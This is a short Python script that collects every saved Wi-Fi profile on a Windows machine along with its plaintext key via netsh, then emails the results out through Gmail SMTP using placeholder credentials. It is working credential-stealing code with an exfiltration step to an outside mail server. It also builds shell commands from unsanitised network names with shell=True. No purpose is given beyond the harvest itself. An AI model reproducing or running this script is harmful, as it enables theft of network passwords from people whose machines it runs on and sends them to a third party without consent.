#!/usr/bin/env python
import re
import subprocess

import chardet

from mail_sender import MailSender


def get_wifi_info():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)

    encoding = chardet.detect(networks)['encoding']
    networks_names_list = re.findall("(?:\\s:\\s)(.*)", networks.decode(encoding))
    result = ""
    for network_name in networks_names_list:
        command = "netsh wlan show profile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result.decode(encoding)
    return result


login = "xxx@gmail.com"
psw = ""
subject = "Wi-Fi Report"
wifi_info = get_wifi_info()

mail_sender = MailSender("smtp.gmail.com", 587, login, psw, login, subject, wifi_info)
mail_sender.sendmail()
